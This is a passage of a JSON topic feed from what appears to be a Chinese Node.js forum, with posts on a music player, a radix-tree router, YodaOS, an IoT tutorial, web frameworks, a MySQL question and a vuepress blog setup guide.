src=\"//static.cnodejs.org/FuxFd6aVqrX0QtkLNma7cLY0Xhdi\" alt=\"image.png\"></p>\n<h2>框架</h2>\n<p>前端  <code>Angular 6</code>, 后端  <code>nestjs</code> + <code>graphql</code>\n若有纰漏请大家补充指正~</p>\n<h2>其它</h2>\n<p><a href=\"https://github.com/xinshangshangxin/MusicPlayer/tree/v1\">早期 jQuery 写的音乐播放器</a>\n<a href=\"https://github.com/xinshangshangxin/MusicPlayer\">早期 angularjs(1.x) 写的音乐播放器</a></p>\n</div>","title":"每首歌只听最High部分的音乐播放器(支持酷狗/网易/虾米)[Angular + nestjs]","last_reply_at":"2019-02-11T07:17:56.996Z","good":false,"top":false,"reply_count":6,"visit_count":1021,"create_at":"2019-02-06T07:40:01.679Z","author":{"loginname":"xinshangshangxin","avatar_url":"https://avatars1.githubusercontent.com/u/8779091?v=4&s=120"}},{"id":"5c5fd3c305cc322e7b137a25","author_id":"591eea623504ce1c2ac45e58","tab":"share","content":"<div class=\"markdown-text\"><p>先放链接：<a href=\"https://github.com/vincent178/flexrouter\">https://github.com/vincent178/flexrouter</a></p>\n<h2>为什么重新发明一个路由轮子？</h2>\n<p>react-router vue-router express 还有koa 都是用的 path-to-regexp, 将路由转化成正则表达式，然后循环比对当前路径找到符合的路由。在大量路由情况下查找性能会比较差。 Go 有个高性能的http路由 <a href=\"https://github.com/julienschmidt/httprouter%EF%BC%8C\">https://github.com/julienschmidt/httprouter，</a> 内部使用 Radix Tree 实现高性能路由查找，我也撸了一个 ts 版本的。</p>\n<h2>特性</h2>\n<p><strong>支持前端和后端:</strong></p>\n<p>后端例子没有用任何node框架 http 路由 <a href=\"https://github.com/vincent178/flexrouter/tree/master/examples/http-server-with-flexrouter\">https://github.com/vincent178/flexrouter/tree/master/examples/http-server-with-flexrouter</a>\n前端例子是 react 页面路由 <a href=\"https://github.com/vincent178/flexrouter/tree/master/examples/react-router-with-flexrouter\">https://github.com/vincent178/flexrouter/tree/master/examples/react-router-with-flexrouter</a></p>\n<p><strong>高性能:</strong></p>\n<p>在2000+路由的情况下，benchmark数据</p>\n<pre class=\"prettyprint\"><code>path-to-regexp#home x 4,247 ops&#x2F;sec ±1.82% (83 runs sampled)\nflexrouter#home x 4,856,189 ops&#x2F;sec ±0.71% (88 runs sampled)\npath-to-regexp#topic-detail x 4,247 ops&#x2F;sec ±1.33% (86 runs sampled)\nflexrouter#topic-detail x 1,254,182 ops&#x2F;sec ±0.82% (88 runs sampled)\n</code></pre><p><strong>多种格式支持:</strong>\nstatic route: <code>/home</code>\nparam route: <code>/topic/:id</code>\nparam route with regex: <code>topic/photo-:id(/\\\\d+/).jpg</code>\nwildcard route: <code>/*site</code></p>\n<p>其他细节 <a href=\"https://github.com/vincent178/flexrouter\">https://github.com/vincent178/flexrouter</a></p>\n<p>fastify也有个类似的实现叫 find-my-way， 但是它实现有点问题，这也是我想自己实现一个版本的原因。</p>\n</div>","title":"高性能基数树路由库 flexrouter，能同时和React和koa一起用的路由库","last_reply_at":"2019-02-11T04:33:12.851Z","good":false,"top":false,"reply_count":4,"visit_count":670,"create_at":"2019-02-10T07:33:23.481Z","author":{"loginname":"vincent178","avatar_url":"https://avatars2.githubusercontent.com/u/2183720?v=4&s=120"}},{"id":"5c5fd8d205cc322e7b137a2f","author_id":"5a49efecf320ae9f0dd5821a","tab":"share","content":"<div class=\"markdown-text\"><p><strong>《软硬结合——从零打造物联网》</strong>，这个教程起源于我两年前做毕业设计时太累了，踩了不少坑，所以决定等有空的时候就整理写一份教程，毕竟自己走过的弯路，可以告诉别人不必再走。<strong>通过此教程，吸引更多人到nodejs开发~</strong></p>\n<h2>教程主要内容</h2>\n<ol>\n<li>告诉大家javascript是个好东西，特别是对于一个人要做所有事的时候，原因如图所示：\n<img src=\"http://ww1.sinaimg.cn/large/005BIQVbgy1fy6ia4qfrdj30nb0ebqm0.jpg\" alt=\"无所不能的JS\"></li>\n<li>在教程里写了demo1与demo2\ndemo1演示了最简单的物联网项目：通过手机控制LED灯开关。硬件上使用淘宝价十几块钱的nodemcu。\ndemo2在demo1的基础上引入了 增加实时性的websocket、数据可视化echart、数据库mongodb。\n为更好地突显javascript的优越性，还完成了<strong>微信小程序</strong>、<strong>.exe应用</strong>以供参考。</li>\n<li>为了保证傻瓜式教学，我录了很多短视频以保证新手们跟着做没有错，并且制作了大量图片以免全是文字导致教程太无聊，</li>\n<li>还简单地讨论了通信协议等内容（TCP、HTTP、websocket、MQTT），让大家学习网络知识。</li>\n<li>本教程会让你学习其它大量的教程，阅读大量的书籍，别人制作得很好的教程我就不重复写。</li>\n</ol>\n<p><img src=\"http://ww1.sinaimg.cn/large/005BIQVbgy1fzbotaayifj30lu0coab7.jpg\" alt></p>\n<h2>最后</h2>\n<p>由于我还是萌新，所制作的教程会受限于个人经验不足，但我会长期维护，随着大家学习时提出的问题，我会完善教程对应不足的地方，编写FAQ。欢迎大家把这教程分享给有需要的人，欢迎大佬们指出不足，我会花时间去做修改。希望此教程能帮到有需要的人。</p>\n<ul>\n<li><a href=\"https://www.scaugreen.cn/posts/44755/\">在线浏览</a></li>\n<li><a href=\"https://github.com/alwxkxk/soft-and-hard\">github</a></li>\n</ul>\n<p><img src=\"https://camo.githubusercontent.com/f5cbcbeb3c56970bf24be29cd48e348316d1f2ac/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f3030354249515662677931667a36647530756267346a333168633071323761392e6a7067\" alt=\"软硬结合\"></p>\n</div>","title":"基于javascript全栈的物联网入门教程——《软硬结合，从零打造物联网》","last_reply_at":"2019-02-11T04:13:24.761Z","good":false,"top":false,"reply_count":3,"visit_count":906,"create_at":"2019-02-10T07:54:58.989Z","author":{"loginname":"alwxkxk","avatar_url":"https://avatars2.githubusercontent.com/u/16029024?v=4&s=120"}},{"id":"5c4fffe0a4647e02328f206f","author_id":"52c005d28a716e0b1578f9cc","tab":"share","content":"<div class=\"markdown-text\"><p>大家好，很开心在这里宣布 YodaOS 开源了。他将承载 Rokid 4年以来对于人工智能和语音交互领域的沉淀，并选择 Node.js 作为操作系统的一等开发公民，全部开放给社区。</p>\n<p><img src=\"//static.cnodejs.org/FonFMOGJSL2v_OCVBkKULbZs2IJR\" alt=\"yoda-arch.png\"></p>\n<p>YodaOS 的架构跟 Android 类似，从下至上，由 Linux Kernel、系统服务和应用框架组成。不过 YodaOS 有以下不同：</p>\n<ul>\n<li>开发者可以直接使用 JavaScript / Node.js 来开发本地应用（技能）；</li>\n<li>封装了 AI 抽象层，可以通过 JavaScript 直接调用到诸如语音激活、语音识别、人脸识别等接口；</li>\n</ul>\n<p>除了支持默认的 Node.js API 外，YodaOS 还提供：</p>\n<ul>\n<li>内置的语音激活和语音识别 API，真正做到了开箱即用（开发）的语音交互系统；</li>\n<li>对音量控制、电源管理、蓝牙、多媒体播放、LED 灯效和 OTA 等都进行了接口封装；</li>\n<li>对物联网开发者来说，内置了标准化的 WebSocket、MQTT 等物联网协议的客户端实现；</li>\n</ul>\n<p>YodaOS 也支持 npm 仓库，开发者可以根据自己的需要在 OS 中运行所需的模块，不过并不推荐使用一些实现起来很重的模块，因为 YodaOS 需要支持中低端设备，所以有时候也需要考虑到性能方面的因素。</p>\n<p>如果遇到一些 npm 仓库确实实现很重，但又不得不用的时候，在 YodaOS 上，我们一般的做法是使用 N-API 桥接 C/C++ 模块，然后保证 JavaScript API 与对应的 npm 包一致。</p>\n<p>同时借助于 N-API，开发者可以将任何 Linux 的库移植到 YodaOS 上，并通过 N-API 以 JavaScript API 方式使用，可以这么理解，N-API 之于 YodaOS，就像 JNI 之于 Android。</p>\n<p><img src=\"//static.cnodejs.org/FkOaVJ5f8rc8m3a_be8D0uQpuBJM\" alt=\"yoda-nodejs.png center\"></p>\n<h3>为什么是 Node.js</h3>\n<p>前面提到了 YodaOS 选择拥抱 Node.js 和 Node.js 开发者，最大的一个原因就是在过去将近10年的时间，从最开始 Ryan Dahl 定义的，一个轻量级的 Web 服务器框架，到如今的 Express、Loopback、Koajs、Midway 和 Egg Framework，在 Web 服务器框架领域已经渐渐成熟。</p>\n<p>依托于 Node.js 提供的运行时，从 Grunt、Gulp 到现在的 Webpack 和 Parcel，在构建工具领域，社区也不断涌现出非常卓越的开源项目来。Node.js 正在发挥每位开发者的想象力，社区中几乎有你需要的一切，甚至于在社区中，有一句流传已久的名言：</p>\n<blockquote>\n<p>“any application that can be written in JavaScript, will eventually be written in JavaScript” ——Atwood’s Law</p>\n</blockquote>\n<p>意思就是说，只要能被 JavaScript 来编写的程序，终将使用 JavaScript 实现。那为什么不用 JavaScript 来写一个操作系统呢？</p>\n<p>当然上面的只是一个有趣的引子，Rokid 真正想做的是让 Node.js 开发者能够以更低的门槛进入语音交互和嵌入式领域。</p>\n<h3>Node.js 与 ShadowNode</h3>\n<p>YodaOS 虽然跟 Android 的架构相似，不过解决的问题，及目标设备并不尽然相同，对于现在越来越便宜的手机，Android 开发者几乎不用担心系统性能的问题。然而对于像智能音响、IoT 终端以及其他嵌入式设备，通常硬件资源都是非常紧缺的，在这种情况下，OS 就要解决开发者“既要节省资源、又要便于开发”的问题。</p>\n<p>于是针对中低端硬件产品（内存介于 128MB 到 256MB 之间），我们创造了 ShadowNode 来解决这个问题，它是 Rokid 基于三星 IoT.js 二次开发的一款 Node.js 运行时，它具备更快的启动速度和更低的资源占用，相比 IoT.js，它：</p>\n<ul>\n<li>提供了更好的错误栈信息和性能调试工具；</li>\n<li>支持了基于 N-API 的跨运行时模块执行；</li>\n<li>针对特定芯片的性能优化，比如 AmLogic A113 和 Kamino18；</li>\n</ul>\n<p>借助于 N-API 的 ABI 兼容特性，我们实现了 OS 上层框架和应用的运行时兼容性。比如开发者完全可以选择在更高级的设备上运行 YodaOS，此时内存和 Flash 不再是瓶颈，开发者只需要更换系统中的 Node.js 运行时，即可获得更快的执行速度，不需要修改一行上层代码。</p>\n<h3>最后</h3>\n<p>我们希望借助 YodaOS，为 Node.js 社区补全终端开发这一版图，让我们用这门亲切的语言，再次回到我们熟悉的“端”的开发。</p>\n<p>如果想一起加入 YodaOS，可以在 GitHub 上关注我们，项目地址：<a href=\"https://github.com/yodaos-project/yodaos\">https://github.com/yodaos-project/yodaos</a></p>\n</div>","title":"YodaOS：一个属于 Node.js 社区的操作系统","last_reply_at":"2019-02-10T13:29:48.032Z","good":true,"top":false,"reply_count":19,"visit_count":3065,"create_at":"2019-01-29T07:25:20.180Z","author":{"loginname":"yorkie","avatar_url":"https://avatars3.githubusercontent.com/u/1935767?v=4&s=120"}},{"id":"5c4ebf61a4647e02328f1bba","author_id":"5c4e697a3819b801aa5a1dde","tab":"ask","content":"<div class=\"markdown-text\"><p>请问下，有三个表，articles(文章), collections（专集）, articles_collection(关联表)\narticles和collections是多对多的关系，\n一个专集下可以收录多篇文章, 这时有两种状态(用articles_collection表中的status字段表示)\n1.收录中等待审核\n2.已收录</p>\n<p>三个表如下</p>\n<pre class=\"prettyprint\"><code>+-------------+--------------+----------------------------+\n|                        articles                         |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| title       | varchar(255) |                            |\n+-------------+--------------+----------------------------+\n\n+-------------+--------------+----------------------------+\n|                        collections                         |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| title       | varchar(255) |                            |\n+-------------+--------------+----------------------------+\n\n+-------------+--------------+----------------------------+\n|                        articles_collection                         |\n+-------------+--------------+----------------------------+\n| article_id          | int(11)      |                                   |\n| collection_id       | int(11)  |                            |\n| status       | int(11) |                            |\n+-------------+--------------+----------------------------+\n</code></pre><p>查询的场景为\n1.查某个专集下的文章, 包括收录中等待审核, 已收录\n2.查某个专集下的文章，只查已收录的</p>\n<p>请问下目前的设计是否合理呢? articles_collection表中索引怎么建合适呢？</p>\n</div>","title":"mysql表、索引设计问题","last_reply_at":"2019-02-10T09:37:56.548Z","good":false,"top":false,"reply_count":7,"visit_count":921,"create_at":"2019-01-28T08:37:53.638Z","author":{"loginname":"hujunyuan8058","avatar_url":"https://avatars3.githubusercontent.com/u/37411247?v=4&s=120"}},{"id":"5c300bf15bf06c5e7e3f17d7","author_id":"5b23c75c5cd02be6409014da","tab":"ask","content":"<div class=\"markdown-text\"><p>想精通node.js，是否需要学习C++?</p>\n</div>","title":"精通node.js需要学习C++吗？","last_reply_at":"2019-02-10T02:31:03.360Z","good":false,"top":false,"reply_count":24,"visit_count":2553,"create_at":"2019-01-05T01:44:17.203Z","author":{"loginname":"sunweiconfidence","avatar_url":"https://avatars3.githubusercontent.com/u/13913055?v=4&s=120"}},{"id":"5c51513ea4647e02328f271d","author_id":"58450b974c17b38d3543639c","tab":"share","content":"<div class=\"markdown-text\"><h1><a href=\"https://github.com/my-soul/souljs\">souljs</a></h1>\n<p>A nodejs web framework, 对koa简单包装，装饰风格，内置开发常用中间件，使用typescript编写</p>\n<h2>安装</h2>\n<pre class=\"prettyprint language- bash\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;my-soul&#x2F;souljs-starter.git\n\nnpm install &amp;&amp; npm run start\n</code></pre><p>Node.js &gt;= 8.0.0 required.</p>\n<h2>快速开始</h2>\n<h4>创建应用实例</h4>\n<pre class=\"prettyprint language-typescript main.ts\"><code>import { createApplication } from &#x27;souljs&#x27;;\n\nasync function main() {\n  const app = await createApplication(__dirname, &#x27;controller&#x2F;*.ts&#x27;);\n\n  app.listen(8080);\n}\n\nmain();\n</code></pre><h4>路由处理并返回数据</h4>\n<pre class=\"prettyprint language-typescript controller&#x2F;user.ts\"><code>[@Controller](&#x2F;user&#x2F;Controller)(&#x27;&#x2F;user&#x27;)\nexport default class User {\n\n  [@Post](&#x2F;user&#x2F;Post)(&#x27;&#x2F;chname&#x27;)\n  changeName() {\n    return ‘hello world’;\n  }\n}\n</code></pre><h4>通过<a href=\"/user/Render\">@Render</a>返回视图</h4>\n<pre class=\"prettyprint language-typescript controller&#x2F;user.ts\"><code>[@Controller](&#x2F;user&#x2F;Controller)(&#x27;&#x2F;user&#x27;)\n@Use(Auth())\nexport default class User {\n\n  [@Get](&#x2F;user&#x2F;Get)()\n  [@Render](&#x2F;user&#x2F;Render)(&#x27;user&#x27;)\n  index() {\n    return { content: &#x27;hi&#x27; };\n  }\n}\n</code></pre><h4>请求参数验证</h4>\n<pre class=\"prettyprint language-typescript\"><code>[@Controller](&#x2F;user&#x2F;Controller)(&#x27;&#x2F;user&#x27;)\nexport default class User {\n\n  [@Post](&#x2F;user&#x2F;Post)(&#x27;&#x2F;chname&#x27;)\n  @QuerySchame(joi.object().keys({\n    id: joi.string()\n  }))\n  @BodySchame(joi.object().keys({\n    name: joi.string().required()\n  }))\n  changeName([@Body](&#x2F;user&#x2F;Body)() body: any, [@Query](&#x2F;user&#x2F;Query)() query: any) {\n    return ResultUtils.ok(body);\n  }\n}\n\n</code></pre><h4>接口描述</h4>\n<p>接口文档默认访问地址: /swagger-ui/index.html</p>\n<pre class=\"prettyprint language-typescript\"><code>[@Controller](&#x2F;user&#x2F;Controller)(&#x27;&#x2F;user&#x27;)\n@ApiUseTags(&#x27;user&#x27;)\n@ApiDescription(&#x27;用户信息&#x27;)\nexport default class User {\n\n  [@Post](&#x2F;user&#x2F;Post)(&#x27;&#x2F;hi&#x27;)\n  @ApiDescription(&#x27;test&#x27;)\n  test() {}\n}\n\n</code></pre><h2>API</h2>\n<h3>createApplication(root, controllers, options): Application</h3>\n<ul>\n<li>\n<p>参数</p>\n<ul>\n<li>{ string } root - 项目路径</li>\n<li>{ string | controller[] } controllers - 控制器的目录位置，使用globs匹配，或者是控制器类的数组</li>\n<li>{ ApplicationOptions }  options - 参考如下ApplicationOptions, 值false不启用功能</li>\n</ul>\n<pre class=\"prettyprint language-typescript\"><code>  interface ApplicationOptions {\n    staticAssets?: { root: string; prefix?: string } | boolean; &#x2F;&#x2F; koa-static&#x27;\n    swagger?: { url: string; prefix?: string } | boolean; &#x2F;&#x2F; swagger-ui\n    bodyparser?: Bodyparser.Options | boolean; &#x2F;&#x2F; koa-bodyparser\n    session?: KoaSession.opts | boolean; &#x2F;&#x2F; koa-session\n    hbs?: { viewPath?: string } | boolean; &#x2F;&#x2F; koa-hbs\n    helmet?: object | boolean; &#x2F;&#x2F; koa-helmet\n  }\n</code></pre></li>\n<li>\n<p>返回值：Application</p>\n</li>\n</ul>\n<h3>Application</h3>\n<p>实例方法</p>\n<ul>\n<li>\n<p>use(mid: Koa.Middleware)</p>\n</li>\n<li>\n<p>listen(port: number)</p>\n</li>\n<li>\n<p>getKoaInstance(): Koa</p>\n</li>\n<li>\n<p>getHttpServer(): http.Server</p>\n</li>\n</ul>\n<h3>http请求装饰器</h3>\n<p>内部使用koa-router中间件，提供对应的方法的装饰器</p>\n<ul>\n<li>\n<p><a href=\"/user/Controller\">@Controller</a>(string|void)</p>\n</li>\n<li>\n<p><a href=\"/user/POST\">@POST</a>(string|void)</p>\n</li>\n<li>\n<p><a href=\"/user/Get\">@Get</a>(string|void)</p>\n</li>\n</ul>\n<h3><a href=\"/user/Render\">@Render</a>(view: string) 模板渲染</h3>\n<p>不能禁用hbs</p>\n<h3>使用<a href=\"https://www.npmjs.com/package/joi\">Joi</a>验证请求参数</h3>\n<ul>\n<li>\n<p>BodySchame(schame: joi.AnySchema)</p>\n</li>\n<li>\n<p>QuerySchame(schame: joi.AnySchema)</p>\n</li>\n</ul>\n<h3>控制器处理方法参数注入</h3>\n<pre class=\"prettyprint language-typescript\"><code>[@Post](&#x2F;user&#x2F;Post)(&#x27;&#x2F;test&#x27;)\ntest([@Body](&#x2F;user&#x2F;Body)() Body: any, [@Query](&#x2F;user&#x2F;Query)() query: any) {}\n  \n</code></pre><p>提供如下修饰器</p>\n<ul>\n<li>\n<p><a href=\"/user/Ctx\">@Ctx</a>() - ctx</p>\n</li>\n<li>\n<p><a href=\"/user/Request\">@Request</a>() - ctx.request</p>\n</li>\n<li>\n<p><a href=\"/user/Response\">@Response</a>() - ctx.Response</p>\n</li>\n<li>\n<p><a href=\"/user/Query\">@Query</a>(string|void) - ctx.request.query[string] | ctx.request.query</p>\n</li>\n<li>\n<p><a href=\"/user/Body\">@Body</a>(string|void) - ctx.request.body[string] | ctx.request.body</p>\n</li>\n<li>\n<p><a href=\"/user/ApplicationInstance\">@ApplicationInstance</a>() - 当前应用实例</p>\n</li>\n<li>\n<p><a href=\"/user/KoaInstance\">@KoaInstance</a>() - 当前koa实例</p>\n</li>\n</ul>\n</div>","title":"一个简单够用的node web框架","last_reply_at":"2019-02-05T05:02:08.994Z","good":false,"top":false,"reply_count":1,"visit_count":1067,"create_at":"2019-01-30T07:24:46.853Z","author":{"loginname":"my-soul","avatar_url":"https://avatars2.githubusercontent.com/u/12870303?v=4&s=120"}},{"id":"5c5696d1e6aaad2ea76dec3f","author_id":"59f6bdff688da99d4fa91e04","tab":"share","content":"<div class=\"markdown-text\"><p>源码：<a href=\"https://github.com/xiaobai2017666/server-update-tool\">https://github.com/xiaobai2017666/server-update-tool</a></p>\n<p>平台是从Win10 到Linux</p>\n<p>觉得平时的上传工具太过于机械，而且更新频繁，就写成脚本了。\n使用示例：</p>\n<pre class=\"prettyprint\"><code>let n=new s({\n    &#x2F;&#x2F; SSH的配置信息============\n    host: &#x27;0.0.0.0&#x27;,\n    port: 80,\n    username: &#x27;root&#x27;,\n    password: &#x27;************&#x27;\n    &#x2F;&#x2F;=========================\n},\n&#x27;F:&#x2F;编程&#x2F;blog&#x2F;public&#x27;, &#x2F;&#x2F;本地需要上传的文件夹路径，结尾不要带&#x2F;\n&#x27;&#x2F;home&#x2F;www&#x27;); &#x2F;&#x2F;服务器上传到的文件夹路径，可以在服务器中不存在，结尾不要带&#x2F;\n\nn.start().then(function() {\n    ...\n})\n</code></pre></div>","title":"学习了一下封装，写了一个更新服务器文件的工具","last_reply_at":"2019-02-03T07:22:57.431Z","good":false,"top":false,"reply_count":0,"visit_count":1094,"create_at":"2019-02-03T07:22:57.431Z","author":{"loginname":"xiaobai2017666","avatar_url":"https://avatars1.githubusercontent.com/u/29399423?v=4&s=120"}},{"id":"5a559e54afa0a121784a8adc","author_id":"567231087223708362cc6c47","tab":"share","content":"<div class=\"markdown-text\"><p>标题虽有点夸大，不过用过nestjs之后，本人是不想在用其他框架了。这里没有想安利大家立马换框架的意思，推荐学习，若要投产，前提是你要足够了解nest。\n准确说，nest不是框架，而是一种区别于commonjs的模块规范，或者说是高阶构建工具，它改变了以往团队协同的编码组织结构，使得模块化开发思想真正得以实现，框架目的不是提高开发技术，而是降低模块间耦合风险，隔离了工作区间，带了前所未有的协同开发体验。具体介绍可以看我的git page  链接：<a href=\"https://yangjdb.github.io/blog/2018/01/08/nest-1/\">nest介绍</a>\nnestjs的学习成本较高，对于基础理论，设计模式，原生语法都要有深厚的理解能力，如果想深入了解nest，建议以下步骤：\n先看es6的proxy，reflect，symbol  链接：<a href=\"http://es6.ruanyifeng.com/#docs/reflect\">es6的Reflect</a>\n再看typescript的装饰器  链接：<a href=\"https://www.tslang.cn/docs/handbook/decorators.html\">TS装饰器</a>\n再看java的六大设计原则（自行百度）\n再看nestjs的开源代码  链接：<a href=\"https://github.com/nestjs/nest\">nestjs</a>\n最后写一个完整的场景覆盖demo（自己动手哦）\n你会发现……\n前端弱爆了，哈哈哈\n开玩笑的，你会爱上nest。</p>\n</div>","title":"nestjs之后，觉得其他框架脚手架可以立碑了……","last_reply_at":"2019-02-02T23:46:07.314Z","good":false,"top":false,"reply_count":25,"visit_count":10902,"create_at":"2018-01-10T05:02:12.824Z","author":{"loginname":"zbmyyang","avatar_url":"https://avatars1.githubusercontent.com/u/11499299?v=4&s=120"}},{"id":"5af54b2e0a36e5312d6ecfb2","author_id":"57ecce1d6ab98805449b95c8","tab":"ask","content":"<div class=\"markdown-text\"><p>我想单元测试 token的验证代码\n我把token放在header 的 Authorization中。 请问如何添加header。\n我使用下面的方法是错误的</p>\n<pre class=\"prettyprint\"><code>it.only(&#x27;post &#x2F;data&#x27;, async () =&gt; {\n\n    const result = await app.httpRequest()\n        .post(&#x27;&#x2F;data&#x27;)\n        .header({\n            Authorization: &#x27;11111&#x27;,\n        })\n        .type(&#x27;form&#x27;)\n        .send({ test: &#x27;admin&#x27;, test: &#x27;root&#x27; });\n\n    console.log(result.body);\n});</code></pre></div>","title":"关于使用egg.js的 单元测试 controller 如何添加header","last_reply_at":"2019-02-02T09:45:19.943Z","good":false,"top":false,"reply_count":7,"visit_count":2021,"create_at":"2018-05-11T07:50:06.243Z","author":{"loginname":"cl1069573062","avatar_url":"https://avatars3.githubusercontent.com/u/15069666?v=4&s=120"}},{"id":"5c554a0a05cc322e7b137116","author_id":"5c5549af05cc322e7b137110","tab":"ask","content":"<div class=\"markdown-text\"><p>看到egg-bin中有处理completion,那请问这个是否是代码补全功能，实际中怎么运用呢。。我按tab并不能起作用啊。。。赐教了。。</p>\n</div>","title":"关于egg-bin中completion功能","last_reply_at":"2019-02-02T07:43:06.684Z","good":false,"top":false,"reply_count":0,"visit_count":638,"create_at":"2019-02-02T07:43:06.684Z","author":{"loginname":"athlan20","avatar_url":"https://avatars2.githubusercontent.com/u/2987056?v=4&s=120"}},{"id":"5bf04e4bbe1b120abac5a6ac","author_id":"5a9c18e28edf56a344937054","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>vuepress 是 Vue 驱动的静态站点生成工具</p>\n</blockquote>\n<ul>\n<li>\n<p><strong>本文仅介绍，搭建静态博客的过程，具体教程及文档请点击进入 <a href=\"https://www.vuepress.cn/\" title=\"vuepress\">vuepress中文网</a></strong></p>\n</li>\n<li>\n<p><a href=\"https://zhb333.github.io/readme-blog/\" title=\"张焕标的博客\">点击进入博客</a></p>\n</li>\n<li>\n<p><a href=\"https://github.com/zhb333/readme-blog\" title=\"zhb333/readme-blog\">点击查看项目代码</a></p>\n</li>\n</ul>\n<h2>vuepress初始化</h2>\n<h3>下面初始化</h3>\n<pre class=\"prettyprint language-sh\"><code># 将 github 新创建的仓库克隆到本地\ngit clone git@github.com:zhb333&#x2F;readme-blog.git\n\n# 进入项目\ncd readme-blog\n\n# npm 初始化, 按照提示回车\nnpm init\n\n# 安装 vuepress\nnpm i vuepress -D\n\n# 安装 gh-pages\nnpm i gh-pages -D\n\n# 创建一个 docs 目录\nmkdir docs\n\n# 创建一个 markdown 文件\necho &#x27;# Hello VuePress&#x27; &gt; docs&#x2F;README.md\n</code></pre><h3>npm 脚本</h3>\n<p>然后，给 <code>package.json</code> 添加一些 <code>scripts</code> 脚本：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;scripts&quot;: {\n    &quot;dev&quot;: &quot;vuepress dev docs&quot;,\n    &quot;build&quot;: &quot;vuepress build docs&quot;,\n    &quot;deploy&quot;: &quot;npm run build &amp;&amp; gh-pages -d docs&#x2F;.vuepress&#x2F;dist&quot;\n  }\n}\n</code></pre><h3>运行本地开发环境</h3>\n<p>运行 <code>vurepress</code> 的本地开发环境</p>\n<pre class=\"prettyprint language-sh\"><code>npm run dev\n</code></pre><p>访问 <code>localhost:8080</code> ， 已经成功开启</p>\n<h2>基础配置</h2>\n<h3>生成静态资源</h3>\n<p>执行下面的命令，生成静态资源</p>\n<pre class=\"prettyprint language-sh\"><code>npm run build\n</code></pre><p>默认情况下，构建的文件会位于 <strong>docs/.vuepress/dist</strong> 中，该文件可以通过 <strong>docs/.vuepress/config.js</strong> 中的 <code>dest</code> 字段进行配置。</p>\n<h3>配置</h3>\n<p>创建 <strong>docs/.vuepress/config.js</strong>， 并进行简单配置</p>\n<pre class=\"prettyprint language-js\"><code>var config = {\n\n  &#x2F;&#x2F; 静态网站部署的目录\n  base: &#x27;&#x2F;readme-blog&#x2F;&#x27;,\n\n  &#x2F;&#x2F; 网站标题\n  title: &#x27;标 の 博客&#x27;,\n\n  &#x2F;&#x2F; &lt;meta name=&quot;description&quot; content=&quot;...&quot;&gt;\n  description: &#x27;种一棵树最好的时间是十年前，其次是现在&#x27;, \n\n  markdown: {\n    \n    &#x2F;&#x2F; 显示代码行号\n    lineNumbers: true\n  }\n}\n\nmodule.exports = config\n</code></pre><h2>博客首页</h2>\n<h3>公共文件</h3>\n<p>创建 <strong>docs/.vuepress/public</strong> 用于存放公共文件</p>\n<p>我在 <strong>public/</strong> , 存在了 <strong>favicon.ico</strong> 图标， 以及 <strong>zlx.jpg</strong> 首页的头像图片</p>\n<h3>简单的首页编写</h3>\n<p>将 <strong>docs/README.md</strong>设置为首页， 修改代码为：</p>\n<pre class=\"prettyprint language-md\"><code>---\nhome: true\nheroImage: &#x2F;zlx.jpg\nfooter: MIT Licensed | Copyright © 2018 ZhangHuanbiao\n---\n</code></pre><h3>设置网站 ico 图标</h3>\n<p>配置网站的 <strong>ico</strong> 图标， 修改 <strong>.vuepress/config.js</strong>：</p>\n<pre class=\"prettyprint language-js{2,3,4}\"><code>const config = {\n  head: [\n    [&#x27;link&#x27;, { rel: &#x27;icon&#x27;, href: &#x27;&#x2F;favicon.ico&#x27; }]\n  ]\n}\n</code></pre><h2>导航栏</h2>\n<h3>配置导航栏</h3>\n<p>使用 <strong>vuepress</strong> 的默认主题配置导航栏 <strong>.vuepress/config.js</strong>：</p>\n<pre class=\"prettyprint language-js{21}\"><code>const nav = [\n  {\n    text: &#x27;前端栈&#x27;,\n    items: [\n      { text: &#x27;Vue&#x27;, link: &#x27;&#x2F;WEB&#x2F;Vue&#x2F;vuepress-blog&#x27; },\n      { text: &#x27;React&#x27;, link: &#x27;&#x2F;WEB&#x2F;React&#x2F;react-router&#x27; }\n    ]\n  }\n]\n\nconst config = {\n  themeConfig: {\n\n    &#x2F;&#x2F; 项目的 github 地址\n    repo: &#x27;zhb333&#x2F;readme-blog&#x27;,\n\n    &#x2F;&#x2F; github 地址的链接名\n    repoLabel: &#x27;代码&#x27;,\n\n    &#x2F;&#x2F; 配置导航栏\n    nav,\n  },\n}\n</code></pre><h3>创建有效的导航资源</h3>\n<p>为了使得导航栏的链接点击有效， 我们创建两个文件：</p>\n<p><strong>docs/WEB/Vue/vuepress-blog.md</strong></p>\n<pre class=\"prettyprint language-md\"><code># 使用&#96;vuepress&#96;搭建静态博客\n\n## vuepress初始化\n\n## 基础配置\n\n## 博客首页\n\n## 导航栏\n</code></pre><p><strong>docs/WEB/React/react-router.md</strong></p>\n<pre class=\"prettyprint language-md\"><code># react-router\n</code></pre><h2>侧边栏</h2>\n<h3>侧边栏配置</h3>\n<p>使用 <strong>vuepress</strong> 的默认主题配置侧边栏 <strong>.vuepress/config.js</strong>：</p>\n<pre class=\"prettyprint language-js{23,24,39}\"><code>const sidebar = {\n  &#x27;&#x2F;WEB&#x2F;&#x27;: [\n    {\n      title: &#x27;Vue&#x27;,\n      children: [\n        &#x27;Vue&#x2F;vuepress-blog&#x27;\n      ]\n    },\n\n    {\n      title: &#x27;React&#x27;,\n      children: [\n        &#x27;React&#x2F;react-router&#x27;\n      ]\n    }\n  ]\n}\n\nconst nav = [\n  {\n    text: &#x27;前端栈&#x27;,\n    items: [\n      { text: &#x27;Vue&#x27;, link: &#x27;&#x2F;WEB&#x2F;&#x27; + sidebar[&#x27;&#x2F;WEB&#x2F;&#x27;][0][&#x27;children&#x27;][0] },\n      { text: &#x27;React&#x27;, link: &#x27;&#x2F;WEB&#x2F;&#x27; + sidebar[&#x27;&#x2F;WEB&#x2F;&#x27;][1][&#x27;children&#x27;][0] }\n    ]\n  }\n]\n\nvar config = {\n  themeConfig: {\n\n    &#x2F;&#x2F; 当前 markdown 的 github 代码链接\n    editLinks: true,\n\n    &#x2F;&#x2F; 链接显示的文本\n    editLinkText: 